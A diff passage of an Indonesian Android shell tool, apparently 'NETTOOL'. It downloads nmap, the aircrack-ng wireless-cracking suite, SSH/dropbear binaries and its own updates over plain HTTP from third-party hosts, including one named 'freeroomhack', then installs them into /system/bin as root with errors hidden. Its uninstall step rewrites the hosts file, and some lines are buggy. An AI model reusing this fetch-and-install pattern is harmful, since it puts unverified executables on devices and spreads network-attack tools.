+					sleep 1
+					echo "NMAP akan dipasang dalam sistem android"
+					sleep 1
+					if [ ! -d /data/bin/ ]; then
+						mkdir mkdir /data/bin/ 2> /dev/null 2> /dev/null
+					fi
+					echo "Mengambil berkas dari server..."
+					wget -O /data/bin/foo sudonano.pe.hu/nmap/foo &>/dev/null
+					wget -O /data/bin/nmap sudonano.pe.hu/nmap/nmap &>/dev/null
+					wget -O /data/bin/nmap-4.01-1.spec sudonano.pe.hu/nmap/nmap-4.01-1.spec &>/dev/null
+					wget -O /data/bin/nmap-mac-prefixes sudonano.pe.hu/nmap/nmap-mac-prefixes &>/dev/null
+					wget -O /data/bin/nmap-os-fingerprints sudonano.pe.hu/nmap/nmap-os-fingerprints &>/dev/null
+					wget -O /data/bin/nmap-protocols sudonano.pe.hu/nmap/nmap-protocols &>/dev/null
+					wget -O /data/bin/nmap-rpc sudonano.pe.hu/nmap/nmap-rpc &>/dev/null
+					wget -O /data/bin/nmap-service-probes sudonano.pe.hu/nmap/nmap-service-probes &>/dev/null
+					wget -O /data/bin/nmap-services sudonano.pe.hu/nmap/nmap-services &>/dev/null
+					echo $pasangsistem
+					if [ -f /system/bin/busybox ]; then
+						mv /data/bin/foo /system/bin/nmap
+					elif [ -f /system/xbin/busybox ]; then
+						mv /data/bin/foo /system/xbin/nmap
+					fi
+					echo $ijinsistem
+					if [ -f /system/bin/nmap ]; then
+						chmod 755 /system/bin/nmap 2>/dev/null
+					elif [ -f /system/xbin/nmap ]; then
+						chmod 755 /system/xbin/nmap 2>/dev/null
+					fi
+					chmod 755 /data/bin/* 2>/dev/null
+					sleep 2
+					echo -n "Instal selesai dan dapat digunakan..."
+					echo $balek
+					read enterKey
+					nettool
+			else
+					echo "\e[1;31m GAGAL!\e[0m"
+					sleep 1
+					echo ""
+					echo "Koneksi mati atau tidak bisa di gunakan, silahkan cek koneksi dan ulangi kembali"
+					echo $balek
+					read enterKey
+					nettool
+			fi
+		fi
+	elif [ $opsi -eq 21 ]; then
+			echo -n "Cek koneksi"
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			if ping -q -c 1 -W 1 google.com >/dev/null; then
+				echo "\e[1;32m OK!\e[0m"
+				sleep 1
+				for wifile in airdriver-ng airmon-ng airmon-zc airbase-ng aircrack-ng airdecap-ng airdecloak-ng aireplay-ng airodump-ng airolib-ng airserv-ng airtun-ng besside-ng besside-ng-crawler buddy-ng easside-ng ifrename ivstools iwconfig iwevent iwgetid iwlist iwmulticall iwpriv iwspy kstats macaddr makeivs-ng packetforge-ng tcpdump tkiptun-ng wesside-ng wmon wpaclean
+				do
+				if [ -f /system/bin/$wifile ]; then 
+					echo "Aircrack sudah terpasang dalam sistem"
+					echo $balek
+					read enterKey
+					nettool
+				elif [ -f /system/xbin/$wifile ]; then
+					echo "Aircrack sudah terpasang dalam sistem"
+					echo $balek
+					read enterKey
+					nettool
+				else
+					echo -n "Aircrack akan dipasang dalam sistem android"
+					sleep 1
+					echo -n "."
+					sleep 1
+					echo -n "."
+					sleep 1
+					echo "."
+					if [ ! -d $filetmp/aircrack/ ]; then
+						mkdir $filetmp/aircrack/ &> /dev/null
+					fi
+					echo "Mengambil berkas dari server..."
+					if [ ! -f $filetmp/aircrack/airbase-ng ]; then 
+						wget -O $filetmp/aircrack/airbase-ng http://sudonano.pe.hu/aircrack/airbase-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/aircrack-ng ]; then 
+						wget -O $filetmp/aircrack/aircrack-ng http://sudonano.pe.hu/aircrack/aircrack-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/aircrack-ng ]; then 
+						wget -O $filetmp/aircrack/aircrack-ng http://sudonano.pe.hu/aircrack/airdecap-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airdecloak-ng ]; then 
+						wget -O $filetmp/aircrack/airdecloak-ng http://sudonano.pe.hu/aircrack/airdecloak-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/aireplay-ng ]; then 
+						wget -O $filetmp/aircrack/aireplay-ng http://sudonano.pe.hu/aircrack/aireplay-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airodump-ng ]; then 
+						wget -O $filetmp/aircrack/airodump-ng http://sudonano.pe.hu/aircrack/airodump-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airolib-ng ]; then 
+						wget -O $filetmp/aircrack/airolib-ng http://sudonano.pe.hu/aircrack/airolib-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airserv-ng ]; then 
+						wget -O $filetmp/aircrack/airserv-ng http://sudonano.pe.hu/aircrack/airserv-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airtun-ng ]; then 
+						wget -O $filetmp/aircrack/airtun-ng http://sudonano.pe.hu/aircrack/airtun-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/besside-ng ]; then 
+						wget -O $filetmp/aircrack/besside-ng http://sudonano.pe.hu/aircrack/besside-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/besside-ng-crawler ]; then 
+						wget -O $filetmp/aircrack/besside-ng-crawler http://sudonano.pe.hu/aircrack/besside-ng-crawler &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/buddy-ng ]; then 
+						wget -O $filetmp/aircrack/buddy-ng http://sudonano.pe.hu/aircrack/buddy-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/easside-ng ]; then 
+						wget -O $filetmp/aircrack/easside-ng http://sudonano.pe.hu/aircrack/easside-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/ifrename ]; then 
+						wget -O $filetmp/aircrack/ifrename http://sudonano.pe.hu/aircrack/ifrename &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/ivstools ]; then 
+						wget -O $filetmp/aircrack/ivstools http://sudonano.pe.hu/aircrack/ivstools &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwconfig ]; then 
+						wget -O $filetmp/aircrack/iwconfig http://sudonano.pe.hu/aircrack/iwconfig &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwevent ]; then 
+						wget -O $filetmp/aircrack/iwevent http://sudonano.pe.hu/aircrack/iwevent &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwgetid ]; then 
+						wget -O $filetmp/aircrack/iwgetid http://sudonano.pe.hu/aircrack/iwgetid &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwlist ]; then 
+						wget -O $filetmp/aircrack/iwlist http://sudonano.pe.hu/aircrack/iwlist &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwmulticall ]; then 
+						wget -O $filetmp/aircrack/iwmulticall http://sudonano.pe.hu/aircrack/iwmulticall &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwpriv ]; then 
+						wget -O $filetmp/aircrack/iwpriv http://sudonano.pe.hu/aircrack/iwpriv &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/iwspy ]; then 
+						wget -O $filetmp/aircrack/iwspy http://sudonano.pe.hu/aircrack/iwspy &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/kstats ]; then 
+						wget -O $filetmp/aircrack/kstats http://sudonano.pe.hu/aircrack/kstats &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/macaddr ]; then 
+						wget -O $filetmp/aircrack/macaddr http://sudonano.pe.hu/aircrack/macaddr &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/makeivs-ng ]; then 
+						wget -O $filetmp/aircrack/makeivs-ng http://sudonano.pe.hu/aircrack/makeivs-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/packetforge-ng ]; then 
+						wget -O $filetmp/aircrack/packetforge-ng http://sudonano.pe.hu/aircrack/packetforge-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/tcpdump ]; then 
+						wget -O $filetmp/aircrack/tcpdump http://sudonano.pe.hu/aircrack/tcpdump &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/tkiptun-ng ]; then 
+						wget -O $filetmp/aircrack/tkiptun-ng http://sudonano.pe.hu/aircrack/tkiptun-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/wesside-ng ]; then 
+						wget -O $filetmp/aircrack/wesside-ng http://sudonano.pe.hu/aircrack/wesside-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/wmon ]; then 
+						wget -O $filetmp/aircrack/wmon http://sudonano.pe.hu/aircrack/wmon &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/wpaclean ]; then 
+						wget -O $filetmp/aircrack/wpaclean http://sudonano.pe.hu/aircrack/wpaclean &> /dev/null
+					fi
+
+					if [ ! -f $filetmp/aircrack/airdriver-ng ]; then 
+						wget -O $filetmp/aircrack/airdriver-ng http://sudonano.pe.hu/aircrack/airdriver-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airmon-ng ]; then 
+						wget -O $filetmp/aircrack/airmon-ng http://sudonano.pe.hu/aircrack/airmon-ng &> /dev/null
+					fi
+					if [ ! -f $filetmp/aircrack/airmon-zc ]; then 
+						wget -O $filetmp/aircrack/airmon-zc http://sudonano.pe.hu/aircrack/airmon-zc &> /dev/null
+					fi
+
+					if [ -f /system/bin/busybox ]; then
+						echo $pasangsistem
+						sleep 2
+						mv $filetmp/aircrack/* /system/bin/ &>/dev/null
+						echo $ijinsistem
+						chmod 755 /system/bin/airdriver-ng &> /dev/null
+						chmod 755 /system/bin/airmon-ng &> /dev/null
+						chmod 755 /system/bin/airmon-zc &> /dev/null
+						chmod 755 /system/bin/airbase-ng &> /dev/null
+						chmod 755 /system/bin/aircrack-ng &> /dev/null
+						chmod 755 /system/bin/airdecap-ng &> /dev/null
+						chmod 755 /system/bin/airdecloak-ng &> /dev/null
+						chmod 755 /system/bin/aireplay-ng &> /dev/null
+						chmod 755 /system/bin/airodump-ng &> /dev/null
+						chmod 755 /system/bin/airolib-ng &> /dev/null
+						chmod 755 /system/bin/airserv-ng &> /dev/null
+						chmod 755 /system/bin/airtun-ng &> /dev/null
+						chmod 755 /system/bin/besside-ng &> /dev/null
+						chmod 755 /system/bin/besside-ng-crawler &> /dev/null
+						chmod 755 /system/bin/buddy-ng &> /dev/null
+						chmod 755 /system/bin/easside-ng &> /dev/null
+						chmod 755 /system/bin/ifrename &> /dev/null
+						chmod 755 /system/bin/ivstools &> /dev/null
+						chmod 755 /system/bin/iwconfig &> /dev/null
+						chmod 755 /system/bin/iwevent &> /dev/null
+						chmod 755 /system/bin/iwgetid &> /dev/null
+						chmod 755 /system/bin/iwlist &> /dev/null
+						chmod 755 /system/bin/iwmulticall &> /dev/null
+						chmod 755 /system/bin/iwpriv &> /dev/null
+						chmod 755 /system/bin/iwspy &> /dev/null
+						chmod 755 /system/bin/kstats &> /dev/null
+						chmod 755 /system/bin/macaddr &> /dev/null
+						chmod 755 /system/bin/makeivs-ng &> /dev/null
+						chmod 755 /system/bin/packetforge-ng &> /dev/null
+						chmod 755 /system/bin/tcpdump &> /dev/null
+						chmod 755 /system/bin/tkiptun-ng &> /dev/null
+						chmod 755 /system/bin/wesside-ng &> /dev/null
+						chmod 755 /system/bin/wmon &> /dev/null
+						chmod 755 /system/bin/wpaclean &> /dev/null
+						if [ -d $filetmp/aircrack/ ]; then rm -d $filetmp/aircrack/; fi
+					elif [ -f /system/xbin/busybox ]; then
+						echo $pasangsistem
+						sleep 2
+						mv $filetmp/aircrack/* /system/xbin/ &>/dev/null
+						echo $ijinsistem
+						chmod 755 /system/bin/airdriver-ng &> /dev/null
+						chmod 755 /system/bin/airmon-ng &> /dev/null
+						chmod 755 /system/bin/airmon-zc &> /dev/null
+						chmod 755 /system/xbin/airbase-ng &> /dev/null
+						chmod 755 /system/xbin/aircrack-ng &> /dev/null
+						chmod 755 /system/xbin/airdecap-ng &> /dev/null
+						chmod 755 /system/xbin/airdecloak-ng &> /dev/null
+						chmod 755 /system/xbin/aireplay-ng &> /dev/null
+						chmod 755 /system/xbin/airodump-ng &> /dev/null
+						chmod 755 /system/xbin/airolib-ng &> /dev/null
+						chmod 755 /system/xbin/airserv-ng &> /dev/null
+						chmod 755 /system/xbin/airtun-ng &> /dev/null
+						chmod 755 /system/xbin/besside-ng &> /dev/null
+						chmod 755 /system/xbin/besside-ng-crawler &> /dev/null
+						chmod 755 /system/xbin/buddy-ng &> /dev/null
+						chmod 755 /system/xbin/easside-ng &> /dev/null
+						chmod 755 /system/xbin/ifrename &> /dev/null
+						chmod 755 /system/xbin/ivstools &> /dev/null
+						chmod 755 /system/xbin/iwconfig &> /dev/null
+						chmod 755 /system/xbin/iwevent &> /dev/null
+						chmod 755 /system/xbin/iwgetid &> /dev/null
+						chmod 755 /system/xbin/iwlist &> /dev/null
+						chmod 755 /system/xbin/iwmulticall &> /dev/null
+						chmod 755 /system/xbin/iwpriv &> /dev/null
+						chmod 755 /system/xbin/iwspy &> /dev/null
+						chmod 755 /system/xbin/kstats &> /dev/null
+						chmod 755 /system/xbin/macaddr &> /dev/null
+						chmod 755 /system/xbin/makeivs-ng &> /dev/null
+						chmod 755 /system/xbin/packetforge-ng &> /dev/null
+						chmod 755 /system/xbin/tcpdump &> /dev/null
+						chmod 755 /system/xbin/tkiptun-ng &> /dev/null
+						chmod 755 /system/xbin/wesside-ng &> /dev/null
+						chmod 755 /system/xbin/wmon &> /dev/null
+						chmod 755 /system/xbin/wpaclean &> /dev/null
+						if [ -d $filetmp/aircrack/ ]; then rm -d $filetmp/aircrack/; fi
+					else
+						echo "Gagal memasang.."
+						sleep 3
+						nettool
+					fi
+					sleep 3
+					echo -n "Instal selesai dan dapat digunakan, "
+					echo $balek
+					read enterKey
+					nettool
+				fi
+				done
+			else
+				echo "\e[1;31m GAGAL!\e[0m"
+				sleep 1
+				echo ""
+				echo "Koneksi mati atau tidak bisa di gunakan, silahkan cek koneksi dan ulangi kembali"
+				echo $balek
+				read enterKey
+				nettool
+			fi
+	elif [ $opsi -eq 22 ]; then
+		echo -n "Cek koneksi"
+		sleep 1
+		echo -n "."
+		sleep 1
+		echo -n "."
+		sleep 1
+		echo -n "."
+		sleep 1
+		if ping -q -c 1 -W 1 google.com >/dev/null; then
+			echo "\e[1;32m OK!\e[0m"
+			for linuxku in bash dropbear dropbearkey ether-wake frotz ftp openscp openssh scp sftp-server ssh ssh-add ssh-agent ssh-keygen ssh-keyscan ssh-keysign wy60
+			do
+			if [ -f /system/bin/$linuxku ]; then 
+				echo "File sudah terpasang, gunakan perintah SSH, OpenSSH, Dropbear dan FTP"
+				echo $balek
+				read enterKey
+				nettool
+			elif [ -f /system/xbin/$linuxku ]; then 
+				echo "File sudah terpasang, gunakan perintah SSH, OpenSSH, Dropbear dan FTP"
+				echo $balek
+				read enterKey
+				nettool
+			else
+				echo "Perintah linux ssh, openssh, dropbear, bash,sftp server akan ditambahkan!"
+				sleep 1
+				echo "Mengambil berkas dari server..."
+				wget -O $filetmp/bash http://freeroomhack.96.lt/linux/bash &>/dev/null
+				wget -O $filetmp/dropbear http://freeroomhack.96.lt/linux/dropbear &>/dev/null
+				wget -O $filetmp/dropbearkey http://freeroomhack.96.lt/linux/dropbearkey &>/dev/null
+				wget -O $filetmp/ether-wake http://freeroomhack.96.lt/linux/ether-wake &>/dev/null
+				wget -O $filetmp/frotz http://freeroomhack.96.lt/linux/frotz &>/dev/null
+				wget -O $filetmp/ftp http://freeroomhack.96.lt/linux/ftp &>/dev/null
+				wget -O $filetmp/openscp http://freeroomhack.96.lt/linux/openscp &>/dev/null
+				wget -O $filetmp/openssh http://freeroomhack.96.lt/linux/openssh &>/dev/null
+				wget -O $filetmp/scp http://freeroomhack.96.lt/linux/scp &>/dev/null
+				wget -O $filetmp/sftp-server http://freeroomhack.96.lt/linux/sftp-server &>/dev/null
+				wget -O $filetmp/ssh http://freeroomhack.96.lt/linux/ssh &>/dev/null
+				wget -O $filetmp/ssh-add http://freeroomhack.96.lt/linux/ssh-add &>/dev/null
+				wget -O $filetmp/ssh-agent http://freeroomhack.96.lt/linux/ssh-agent &>/dev/null
+				wget -O $filetmp/ssh-keygen http://freeroomhack.96.lt/linux/ssh-keygen &>/dev/null
+				wget -O $filetmp/ssh-keyscan http://freeroomhack.96.lt/linux/ssh-keyscan &>/dev/null
+				wget -O $filetmp/ssh-keysign http://freeroomhack.96.lt/linux/ssh-keysign &>/dev/null
+				wget -O $filetmp/wy60 http://freeroomhack.96.lt/linux/wy60 &>/dev/null
+				echo $pasangsistem
+				sleep 2
+				if [ -f /system/bin/busybox 2>/dev/null ]; then
+					mv $filetmp/bash /system/bin/bash &>/dev/null
+					mv $filetmp/dropbear /system/bin/dropbear &>/dev/null
+					mv $filetmp/dropbearkey /system/bin/dropbearkey &>/dev/null
+					mv $filetmp/ether-wake /system/bin/ether-wake &>/dev/null
+					mv $filetmp/frotz /system/bin/frotz &>/dev/null
+					mv $filetmp/ftp /system/bin/ftp &>/dev/null
+					mv $filetmp/openscp /system/bin/openscp &>/dev/null
+					mv $filetmp/openssh /system/bin/openssh &>/dev/null
+					mv $filetmp/scp /system/bin/scp &>/dev/null
+					mv $filetmp/sftp-server /system/bin/sftp-server &>/dev/null
+					mv $filetmp/ssh /system/bin/ssh &>/dev/null
+					mv $filetmp/ssh-add /system/bin/ssh-add &>/dev/null
+					mv $filetmp/ssh-agent /system/bin/ssh-agent &>/dev/null
+					mv $filetmp/ssh-keygen /system/bin/ssh-keygen &>/dev/null
+					mv $filetmp/ssh-keyscan /system/bin/ssh-keyscan &>/dev/null
+					mv $filetmp/ssh-keysign /system/bin/ssh-keysign &>/dev/null
+					mv $filetmp/wy60 /system/bin/wy60 &>/dev/null
+					echo $ijinsistem
+					sleep 2
+					chmod 775 /system/bin/bash &>/dev/null
+					chmod 775 /system/bin/dropbear &>/dev/null
+					chmod 775 /system/bin/dropbearkey &>/dev/null
+					chmod 775 /system/bin/ether-wake &>/dev/null
+					chmod 775 /system/bin/frotz &>/dev/null
+					chmod 775 /system/bin/ftp &>/dev/null
+					chmod 775 /system/bin/openscp &>/dev/null
+					chmod 775 /system/bin/openssh &>/dev/null
+					chmod 775 /system/bin/scp &>/dev/null
+					chmod 775 /system/bin/sftp-server &>/dev/null
+					chmod 775 /system/bin/ssh &>/dev/null
+					chmod 775 /system/bin/ssh-add &>/dev/null
+					chmod 775 /system/bin/ssh-agent &>/dev/null
+					chmod 775 /system/bin/ssh-keygen &>/dev/null
+					chmod 775 /system/bin/ssh-keyscan &>/dev/null
+					chmod 775 /system/bin/ssh-keysign &>/dev/null
+					chmod 775 /system/bin/wy60
+					echo "Pemasangan selesai, perintah SSH, Dropbear, OpenSSH, FTP dapat digunakan"
+					echo $balek
+					read enterKey
+					nettool
+				elif [ -f /system/xbin/busybox 2>/dev/null ]; then
+
+					mv $filetmp/bash /system/xbin/bash &>/dev/null
+					mv $filetmp/dropbear /system/xbin/dropbear &>/dev/null
+					mv $filetmp/dropbearkey /system/xbin/dropbearkey &>/dev/null
+					mv $filetmp/ether-wake /system/xbin/ether-wake &>/dev/null
+					mv $filetmp/frotz /system/xbin/frotz &>/dev/null
+					mv $filetmp/ftp /system/xbin/ftp &>/dev/null
+					mv $filetmp/openscp /system/xbin/openscp &>/dev/null
+					mv $filetmp/openssh /system/xbin/openssh &>/dev/null
+					mv $filetmp/scp /system/xbin/scp &>/dev/null
+					mv $filetmp/sftp-server /system/xbin/sftp-server &>/dev/null
+					mv $filetmp/ssh /system/xbin/ssh &>/dev/null
+					mv $filetmp/ssh-add /system/xbin/ssh-add &>/dev/null
+					mv $filetmp/ssh-agent /system/xbin/ssh-agent &>/dev/null
+					mv $filetmp/ssh-keygen /system/xbin/ssh-keygen &>/dev/null
+					mv $filetmp/ssh-keyscan /system/xbin/ssh-keyscan &>/dev/null
+					mv $filetmp/ssh-keysign /system/xbin/ssh-keysign &>/dev/null
+					mv $filetmp/wy60 /system/xbin/wy60 &>/dev/null
+					echo $ijinsistem
+					sleep 2
+					chmod 775 /system/xbin/bash &>/dev/null
+					chmod 775 /system/xbin/dropbear &>/dev/null
+					chmod 775 /system/xbin/dropbearkey &>/dev/null
+					chmod 775 /system/xbin/ether-wake &>/dev/null
+					chmod 775 /system/xbin/frotz &>/dev/null
+					chmod 775 /system/xbin/ftp &>/dev/null
+					chmod 775 /system/xbin/openscp &>/dev/null
+					chmod 775 /system/xbin/openssh &>/dev/null
+					chmod 775 /system/xbin/scp &>/dev/null
+					chmod 775 /system/xbin/sftp-server &>/dev/null
+					chmod 775 /system/xbin/ssh &>/dev/null
+					chmod 775 /system/xbin/ssh-add &>/dev/null
+					chmod 775 /system/xbin/ssh-agent &>/dev/null
+					chmod 775 /system/xbin/ssh-keygen &>/dev/null
+					chmod 775 /system/xbin/ssh-keyscan &>/dev/null
+					chmod 775 /system/xbin/ssh-keysign &>/dev/null
+					chmod 775 /system/xbin/wy60 &>/dev/null
+					echo "Pemasangan selesai, perintah SSH, Dropbear, OpenSSH, FTP dapat digunakan"
+					echo $balek
+					read enterKey
+					nettool
+				else
+					echo "Busybox tidak ditemukan!"
+					echo $balek
+					read enterKey
+					nettool
+				fi
+			fi
+			done
+		else
+			echo "\e[1;31m GAGAL!\e[0m"
+			sleep 1
+			echo ""
+			echo "Koneksi mati atau tidak bisa di gunakan, silahkan cek koneksi dan ulangi kembali"
+			echo $balek
+			read enterKey
+			nettool
+		fi
+		read enterKey
+		nettool
+	elif [ $opsi -eq 100 ]; then
+		clear
+		echo "Semua berkas NETTOOL akan dihapus"
+		sleep 2
+		rm -f /data/lognettool/pingtool.txt &> /dev/null
+		rm -d /data/lognettool  &> /dev/null
+		rm -f $filetmp/hostterinstall1 &> /dev/null
+		rm -f $filetmp/komandohost &> /dev/null
+		rm -f /system/bin/n &> /dev/null
+		rm -f /system/bin/py &> /dev/null
+		rm -f /system/bin/airbase-ng &> /dev/null
+		rm -f /system/bin/aircrack-ng &> /dev/null
+		rm -f /system/bin/airdecap-ng &> /dev/null
+		rm -f /system/bin/airdecloak-ng &> /dev/null
+		rm -f /system/bin/aireplay-ng &> /dev/null
+		rm -f /system/bin/airodump-ng &> /dev/null
+		rm -f /system/bin/airolib-ng &> /dev/null
+		rm -f /system/bin/airserv-ng &> /dev/null
+		rm -f /system/bin/airtun-ng &> /dev/null
+		rm -f /system/bin/besside-ng &> /dev/null
+		rm -f /system/bin/besside-ng-crawler &> /dev/null
+		rm -f /system/bin/buddy-ng &> /dev/null
+		rm -f /system/bin/easside-ng &> /dev/null
+		rm -f /system/bin/ifrename &> /dev/null
+		rm -f /system/bin/ivstools &> /dev/null
+		rm -f /system/bin/iwconfig &> /dev/null
+		rm -f /system/bin/iwevent &> /dev/null
+		rm -f /system/bin/iwgetid &> /dev/null
+		rm -f /system/bin/iwlist &> /dev/null
+		rm -f /system/bin/iwmulticall &> /dev/null
+		rm -f /system/bin/iwpriv &> /dev/null
+		rm -f /system/bin/iwspy &> /dev/null
+		rm -f /system/bin/kstats &> /dev/null
+		rm -f /system/bin/macaddr &> /dev/null
+		rm -f /system/bin/makeivs-ng &> /dev/null
+		rm -f /system/bin/packetforge-ng &> /dev/null
+		rm -f /system/bin/tcpdump &> /dev/null
+		rm -f /system/bin/tkiptun-ng &> /dev/null
+		rm -f /system/bin/wesside-ng &> /dev/null
+		rm -f /system/bin/wmon &> /dev/null
+		rm -f /system/bin/wpaclean &> /dev/null
+		rm -f /system/xbin/airbase-ng &> /dev/null
+		rm -f /system/xbin/aircrack-ng &> /dev/null
+		rm -f /system/xbin/airdecap-ng &> /dev/null
+		rm -f /system/xbin/airdecloak-ng &> /dev/null
+		rm -f /system/xbin/aireplay-ng &> /dev/null
+		rm -f /system/xbin/airodump-ng &> /dev/null
+		rm -f /system/xbin/airolib-ng &> /dev/null
+		rm -f /system/xbin/airserv-ng &> /dev/null
+		rm -f /system/xbin/airtun-ng &> /dev/null
+		rm -f /system/xbin/besside-ng &> /dev/null
+		rm -f /system/xbin/besside-ng-crawler &> /dev/null
+		rm -f /system/xbin/buddy-ng &> /dev/null
+		rm -f /system/xbin/easside-ng &> /dev/null
+		rm -f /system/xbin/ifrename &> /dev/null
+		rm -f /system/xbin/ivstools &> /dev/null
+		rm -f /system/xbin/iwconfig &> /dev/null
+		rm -f /system/xbin/iwevent &> /dev/null
+		rm -f /system/xbin/iwgetid &> /dev/null
+		rm -f /system/xbin/iwlist &> /dev/null
+		rm -f /system/xbin/iwmulticall &> /dev/null
+		rm -f /system/xbin/iwpriv &> /dev/null
+		rm -f /system/xbin/iwspy &> /dev/null
+		rm -f /system/xbin/kstats &> /dev/null
+		rm -f /system/xbin/macaddr &> /dev/null
+		rm -f /system/xbin/makeivs-ng &> /dev/null
+		rm -f /system/xbin/packetforge-ng &> /dev/null
+		rm -f /system/xbin/tcpdump &> /dev/null
+		rm -f /system/xbin/tkiptun-ng &> /dev/null
+		rm -f /system/xbin/wesside-ng &> /dev/null
+		rm -f /system/xbin/wmon &> /dev/null
+		rm -f /system/xbin/wpaclean &> /dev/null
+		if [ -f $filetmp/tosnettool ]; then rm -f $filetmp/tosnettool 2> /dev/null; fi
+		if [ -f $filetmp/tosnettool ]; then rm -f $filetmp/tosnettool 2> /dev/null; fi
+		if [ -f $tmpsd/ShowIp.txt ]; then rm -f $tmpsd/ShowIp.txt 2> /dev/null; fi
+		if [ -f $tmpsd/backupalamathwmanual ]; then rm -f $tmpsd/backupalamathwmanual 2> /dev/null; fi
+		if [ -f $tmpsd/backupalamathw ]; then rm -f $tmpsd/backupalamathw 2> /dev/null; fi
+		if [ -f $filetmp/.bootkali.sh ]; then rm -f $filetmp/.bootkali.sh 2> /dev/null; fi
+		if [ -f $filetmp/hostterinstall ]; then rm -f $filetmp/hostterinstall 2> /dev/null; fi
+		if [ -f /system/etc/hosts ]; then rm -f /system/etc/hosts 2> /dev/null; fi
+		echo '127.0.0.1 localhost' >> /system/etc/hosts
+		echo '::1 localhost #[IPv6]' >> /system/etc/hosts
+		chmod 644 /system/etc/hosts
+		if [ -d /system/bin/NMAP_for_android/ ]; then rm -rf /system/bin/NMAP_for_android/ 2> /dev/null; fi
+		if [ -f $filetmp/.bootkali.sh ]; then rm -f $filetmp/.bootkali.sh 2> /dev/null; fi
+		if [ -f $filetmp/.runkali.sh ]; then rm-f  $filetmp/.runkali.sh 2> /dev/null; fi
+		if [ -d /data/bin/ ]; then rm -rf /data/bin/ 2> /dev/null; fi
+		if [ -f /system/bin/nmap* ]; then rm -f /system/bin/nmap* 2> /dev/null; fi
+		if [ -f /system/bin/foo ]; then rm -f /system/bin/foo 2> /dev/null; fi
+		if [ -f $tmpsd/nmap ]; then rm -f $tmpsd/nmap 2> /dev/null; fi
+		if [ -d /data/local/mnt/ ]; then rm -rf /data/local/mnt/ 2> /dev/null; fi
+		if [ -d $tmpsd/Whois/ ]; then rm -rf $tmpsd/Whois/ 2> /dev/null; fi
+		if [ -f /system/bin/nettool ]; then rm -f /system/bin/nettool 2> /dev/null; fi
+		exit
+	elif [ $opsi -eq 101 ]; then
+		clear
+		echo -n "Mengecek Pembaruan"
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo -n "."
+			sleep 1
+			echo "."
+				if [ `curl -sI http://sudonano.pe.hu/nettool/nettool | grep Length: | awk '{print $2}'` == `wc -c /system/bin/nettool | awk '{print $1}'` &> /dev/null ]; then
+					sleep 1
+					echo "NETTOOL sudah terbaru, enter untuk kembali..."
+					read enterKey
+					nettool
+				else
+					sleep 1
+					echo "NETTOOL akan di perbarui..."
+					sleep 1
+					echo "Mengunduh pembaruan..."
+					wget -O $tmpsd/netme http://sudonano.pe.hu/nettool/nettool &> /dev/null
+					echo -n "Memasang berkas kedalam sistem"
+					sleep 1
+					echo -n "."
+					sleep 1
+					mv $tmpsd/netme /system/bin/nettool &> /dev/null
+					echo -n "."
+					chmod 755 /system/bin/nettool &> /dev/null
+					sleep 1
+					echo "."
+					echo "NETTOOL telah diperbarui, memulai ulang NETTOOL"
+					sleep 3
+					nettool
+				fi
+	elif [ $opsi -eq 102 ]; then
+		echo ""
+		echo "Ingin melakukan memulai ulang? Y/n"
+		read matiin
+		for oke in y Y ya Yes YEs YES yes Ya YA yA yEs YeS yES
+		do
+		if [ $matiin == $oke ]; then
+			reboot
+		else
+			nettool
+		fi
+		done
+	elif [ $opsi -eq 110 ]; then
+		clear
+		echo "Menerapkan Optimasi Baterai"
+		echo ""
+		sh /system/etc/init.d/nanocop
+		echo ""
+		echo $balek
+		read enterKey
+		nettool
+	elif [ $opsi -eq 111 ]; then
+		nettool
+	else
+		clear
+		echo "Perintah Salah"
+		sleep 3
+		exit
+	fi
+elif [ $option -eq 21 ]; then
+	for dataseeder in /system/bin/seeder /system/xbin/rngd /system/xbin/entro
+		do
+		if [[ -f $dataseeder ]]; then
+			clear
+			seeder
+		else
+			echo "Binary tidak dapat ditemukan"
+			echo -n "Mengambil data Entropy Generator dari server"
+			wget -O /data/lognettool/seederbin http://sudonano.pe.hu/seeder/bin/seeder &> /dev/null
+			sleep 1
+			echo -n "."
+			wget -O /data/lognettool/rngdxbin http://sudonano.pe.hu/seeder/xbin/rngd &> /dev/null
+			sleep 1
+			echo -n "."
+			wget -O /data/lognettool/entroxbin http://sudonano.pe.hu/seeder/xbin/entro &> /dev/null
+			sleep 1
+			echo "."
+			sleep 1
+			echo "Memasang ke sistem..."
+			mv /data/lognettool/seederbin /system/bin/seeder
+			mv /data/lognettool/rngdxbin /system/xbin/rngd
+			mv /data/lognettool/entroxbin /system/xbin/entro
